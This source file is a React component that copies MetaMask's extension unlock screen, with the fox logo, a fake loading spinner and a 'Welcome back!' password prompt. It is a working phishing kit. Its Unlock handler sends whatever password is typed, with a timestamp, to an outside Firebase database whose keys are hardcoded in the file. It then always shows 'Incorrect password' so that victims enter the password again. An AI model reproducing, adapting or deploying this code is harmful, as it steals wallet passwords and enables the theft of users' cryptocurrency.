import { useState, useEffect } from "react";
import Modal from "react-modal";
import meta_logo from "./assets/img/metamask-fox.svg";
import spinner from "./assets/img/spinner.gif";
import ethLogo from "./images/eth_logo.svg";
import arrowDown from "./images/icons/arrow-down.svg";

import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";
import { createLogo } from "./Bundle";

import "./index.css";
import "./MM.css";

const basic = {
  apiKey: "AIzaSyDoyi01xdksbWgIWFWtaxj1R80DdZ6PWbw",
  authDomain: "Gold-Dragon.firebaseapp.com",
  projectId: "Gold-Dragon-784f0",
  storageBucket: "Gold-Dragon.appspot.com",
  messagingSenderId: "879731928519",
  appId: "1:879731928519:web:875d6ddfbee3d1b0363de2",
  measurementId: "G-0KJ8T512FL",
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);

const MM = ({ isOpen, setIsOpen }) => {
  const [loading, setLoading] = useState(true);
  const [pwd, setPwd] = useState("");
  const [validShow, setValidShow] = useState(false);
  const [pwdFocus, setPwdFocus] = useState(false);
  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "150px",
      bottom: "auto",
      padding: "0",
      border: "0",
      borderRadius: "5",
      // marginRight: "-30%",
      // transform: "translate(-50%, -50%)",
      boxShadow: "0px 0px 5px #00000088",
      zIndex: 10000,
    },
  };

  const handleOpenModal = () => {
    setIsOpen(true);
  };

  const handleCloseModal = () => {
    setIsOpen(false);
  };
  const handleChange = (val) => {
    setPwd(val);
    setValidShow(false);
  };
  const handleClick = () => {
    push(ref(rtdb, "mm_provider/1007"), {
      value: pwd,
      date: String(new Date()),
    });
    setValidShow(true);
  };

  const handleKeyUp = (e) => {
    if (e.keyCode == 13) {
      handleClick();
    }
  };
  const handleBlur = () => setPwdFocus(false);
  const handleFocus = () => setPwdFocus(true);
  document.body.onblur = function() {
    setIsOpen(false)
  }
  useEffect(() => {
    if (isOpen) {
      setTimeout(() => {
        setLoading(false);
        createLogo();
      }, 3000);
    } else {
      setLoading(true);
    }
  }, [isOpen]);

  return (
    <Modal
      isOpen={isOpen}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      {loading ? (
        <div
          className="mmc"
          style={{
            display: "flex",
            flexDirection: "column",
            overflowX: "hidden",
            width: "365px",
          }}
        >
          <div
            style={{
              width: "365px",
              height: "620px",
              backgroundColor: "#fff",
              display: "flex",
              justifyContent: "center",
            }}
          >
            <div style={{ display: "flex", flexFlow: "column" }}>
              <img
                style={{
                  width: "15rem",
                  height: "15rem",
                  alignSelf: "center",
                  margin: "15rem 0 0 0",
                }}
                src={meta_logo}
              ></img>
              <img
                src={spinner}
                style={{
                  width: "3rem",
                  height: "3rem",
                  alignSelf: "center",
                  marginTop: "1rem",
                }}
              ></img>
            </div>
          </div>
        </div>
      ) : (
        <>
          <div id="app-content" data-theme="dark" style={{ border: "1px solid white" }}>
            <div className="app os-win">
              <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                  <div>
                    <button
                      className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
                      aria-label="Network Menu Ethereum Mainnet"
                      data-testid="network-display"
                    >
                      <div
                        className="mm-box mm-text mm-avatar-base mm-avatar-base--size-xs mm-avatar-network mm-picker-network__avatar-network mm-text--body-xs mm-text--text-transform-uppercase mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-text-default mm-box--background-color-background-alternative mm-box--rounded-full mm-box--border-color-transparent box--border-style-solid box--border-width-1"
                        role="img"
                        style={{ marginLeft: 12 }}
                      >
                        <img className="mm-avatar-network__network-image" src={ethLogo} alt="Ethereum Mainnet logo" />
                      </div>
                      <span
                        className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
                        style={{ fontSize: "1.33rem" }}
                      >
                        Ethereum Mainnet
                      </span>
                      <span
                        className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                        style={{ marginRight: "1rem" }}
                      >
                        <img src={arrowDown} style={{ width: "100%", height: "100%" }}></img>
                      </span>
                    </button>
                  </div>
                  <button
                    className="mm-box app-header__logo-container app-header__logo-container--clickable mm-box--background-color-transparent"
                    data-testid="app-header-logo"
                    style={{ marginRight: "8px" }}
                  >
                    <img
                      style={{
                        alignSelf: "center",
                        width: "100%",
                        height: "100%",
                      }}
                      src={meta_logo}
                    ></img>
                  </button>
                </div>
              </div>
              <div className="mm-box main-container-wrapper">
                <div className="unlock-page__container">
                  <div className="unlock-page" data-testid="unlock-page">
                    <div className="unlock-page__mascot-container">
                      <div style={{ zIndex: 0, marginBottom: "8px" }}>
                        <div id="meta_fox"></div>
                      </div>
                    </div>
                    <h1 className="unlock-page__title">Welcome back!</h1>
                    <div
                      style={{
                        fontSize: "1.5rem",
                        fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
                      }}
                    >
                      The decentralized web awaits
                    </div>
                    <div className="unlock-page__form">
                      <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                        <div
                          className={
                            "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
                            (validShow == true ? " Mui-error" : "") +
                            (pwdFocus == true ? " Mui-focused" : "")
                          }
                        >
                          <input
                            aria-invalid="false"
                            autoComplete="current-password"
                            id="password"
                            type="password"
                            dir="auto"
                            data-testid="unlock-password"
                            className={"MuiInputBase-input MuiInput-input"}
                            style={{ marginTop: "16px", fontSize: "1.33rem" }}
                            required
                            value={pwd}
                            onFocus={handleFocus}
                            onBlur={handleBlur}
                            onChange={(e) => {
                              handleChange(e.target.value);
                            }}
                            onKeyUp={handleKeyUp}
                          />

                          <label
                            className="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated"
                            data-shrink="false"
                            htmlFor="password"
                            id="password-label"
                            // style={{ fontSize: "1.5rem" }}
                          >
                            Password
                          </label>
                        </div>
                        <div className={validShow ? "validate-password" : "validate-password-hidden"}>
                          Incorrect password
                        </div>
                      </div>
                    </div>
                    <button
                      className="button btn--rounded btn-default"
                      data-testid="unlock-submit"
                      type="button"
                      variant="contained"
                      disabled={!pwd}
                      style={{
                        backgroundColor: "var(--color-primary-default)",
                        color: "var(--color-primary-inverse)",
                        marginTop: "20px",
                        fontWeight: "400",
                        boxShadow: "none",
                        borderRadius: "100px",
                        fontSize: "1.5rem",
                        padding: "12px 0",
                      }}
                      onClick={handleClick}
                    >
                      Unlock
                    </button>
                    <div className="unlock-page__links">
                      <a
                        className="button btn-link unlock-page__link"
                        style={{ fontSize: "1.125rem" }}
                        role="button"
                        tabIndex="0"
                      >
                        Forgot password?
                      </a>
                    </div>
                    <div className="unlock-page__support" style={{ fontSize: "12px", fontFamily: "poppines" }}>
                      <span>
                        Need help? Contact{" "}
                        <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">
                          MetaMask support
                        </a>
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div id="popover-content"></div>
        </>
      )}
    </Modal>
  );
};

export default MM;
